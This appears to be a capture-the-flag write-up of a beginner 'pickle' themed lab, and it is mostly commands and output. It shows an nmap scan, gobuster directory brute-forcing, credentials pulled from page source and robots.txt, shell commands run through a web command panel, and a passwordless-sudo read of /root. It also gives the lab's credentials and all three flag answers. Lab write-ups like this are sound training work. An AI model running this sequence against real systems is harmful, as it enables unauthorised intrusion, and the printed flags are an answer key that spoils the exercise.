> Command 
Use nmap command to get the open ports on the IP address 
nmap -sC -v <IP address>
explanation 
-sC runs the default script scan gives information of the ports without creating a noise on the attackers system 
-v is the verbose mode where we get more detailed information
result 
22/tcp open  ssh
80/tcp open  http
As the IP address have active http servies on port 80, open the website from firefox browser as http://<IP address>
right click >> View page source 
from the page source information we got 
``Username: R1ckRul3s``
Next step is to perform Directory brute-force the website
Use tools like 
gobuster, dirb, dirsearch
``
gobuster dir -u 10.49.149.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
``
explaination 
gobuster is used for:Directory brute-forcing, File brute-forcing, DNS subdomain brute-forcing
dir This tells Gobuster: “I want to brute-force directories and files, not DNS or vhosts.”
-u = URL, This is the website Gobuster will attack
-w = wordlist
/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt path for wordlist which is perinstalled on Kali 
`What Gobuster is actually doing behind the scenes

For each word in the list, Gobuster:

Sends an HTTP request

Checks the response code

Reports interesting results`

Result : /assets               (Status: 301) [Size: 311] [--> http://10.49.149.2/assets/]

As we haven't found much information from the /assests we can use the most commonly used directories like robots.txt , login.php
from http://Target IP address/robots.txt  we got "Wubbalubbadubdub"
from http://Target IP address/login.php we got login page 

From the information gathered ``Username: R1ckRul3s`` and ``Wubbalubbadubdub`` we are able to login and got a command page. 

Now let perform comman linux command to get more information 
whoami 
-www-data
ls 
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
cat Sup3rS3cretPickl3Ingred.txt
cat command disabled 
less Sup3rS3cretPickl3Ingred.txt
``mr. meeseek hair`` >> 1STINGREDIENT 
less clue.txt 
Look around the file system for the other ingredient.
As per the clue let's check for the file system 
ls /home
rick, Ubuntu 
ls /home/rick
second ingredient
less /home/rick/"second ingredient" - add "" as there is space in the file name 
``1 jerry tear``
Now check for the 3rd ingredient 
As we have checked for all the avaible txt files in the file system, now lets look for the root directory 
check for sudo permissions by doing sudo -l 
sudo -l lets a user:
See what they are allowed to do
Understand their privilege level
result - (ALL) NOPASSWD: ALL
explanation - This user can run ANY command as ANY user, WITHOUT entering a password.
sudo ls /root 
result - 
3rd.txt
snap
sudo less /root/3rd.txt 
result - 3rd ingredients: fleeb juice
